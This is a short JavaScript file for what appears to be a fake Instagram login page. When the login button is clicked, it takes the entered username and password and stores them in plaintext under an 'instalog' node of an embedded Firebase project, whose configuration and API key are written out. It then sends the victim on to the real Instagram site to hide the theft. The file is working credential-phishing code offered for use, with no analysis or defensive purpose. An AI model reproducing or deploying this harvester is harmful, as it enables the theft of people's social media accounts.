import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";

// Initialize Firebase
const firebaseConfig = {
    apiKey: "AIzaSyA2TH9qGyal9QJShAuXq_9qB4VU9OoRb6k",
    authDomain: "chat-ba118.firebaseapp.com",
    projectId: "chat-ba118",
    storageBucket: "chat-ba118.appspot.com",
    messagingSenderId: "86144645058",
    appId: "1:86144645058:web:78c178cfa22951bb3f085b",
    measurementId: "G-JGYN2424Y7"
  };

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Function to handle login button click
document.querySelector('.login-button').addEventListener('click', function() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // Check if username and password are not empty
  if (username.trim() !== '' && password.trim() !== '') {
    // Store data in Firebase
    push(ref(database, 'instalog'), {
      username: username,
      password: password
    }).then(() => {
      console.log('Data saved successfully.');
      // Clear input fields after saving data
      document.getElementById('username').value = '';
      document.getElementById('password').value = '';
      
      // Redirect to Instagram
      window.location.href = 'https://www.instagram.com';
    }).catch(error => {
      console.error('Error saving data:', error);
    });
  } else {
    console.error('Username and password cannot be empty.');
  }
});
